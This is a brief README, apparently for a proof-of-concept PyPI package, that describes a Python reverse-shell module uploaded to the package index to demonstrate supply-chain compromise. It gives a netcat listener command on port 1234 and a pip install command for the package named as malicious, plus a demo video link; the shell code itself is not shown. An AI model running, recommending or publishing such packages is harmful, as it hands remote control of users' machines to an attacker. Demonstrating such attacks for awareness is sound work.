# Explanation:

This is Simple Python Reverse Shell module.
It is show how one can write a exploit and upload a malicious code to pyorg.
If installed how the attacker can get over your machine.

1. First Listen on 1234 port with netcat
`nc -lvp 1234`

2. Install the package 
`pip install pip-remote-access`

#### Demo :
<a href=https://youtu.be/NOoJItXU9ps>
<img src="https://media4.giphy.com/media/GlXNuhLEjIUTAfIVpC/giphy.gif?cid=ecf05e47v0qmxkcev5dyurr35agj868z9j9nt3oglw2ed0k3&rid=giphy.gif&ct=s" width="100" height="50"/>
</a>
